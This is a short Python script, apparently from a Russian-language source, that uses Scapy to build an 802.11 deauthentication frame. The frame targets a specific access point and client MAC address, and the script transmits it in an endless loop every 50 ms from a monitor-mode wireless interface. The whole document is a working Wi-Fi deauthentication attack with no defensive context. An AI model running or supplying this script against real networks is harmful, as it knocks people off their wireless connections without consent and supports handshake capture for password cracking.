from scapy.all import *

frame = RadioTap() /Dot11(type=0, 
                          subtype=12, 
                          addr1='50:ff:20:6a:e5:a8', 
                          addr2='c4:3a:be:71:22:7b')
sendp(frame, iface='wlan1', inter=0.050, loop=1, monitor=True)

#Здесь addr1 – MAC-адрес точки доступа, addr2 – MAC-адрес клиента.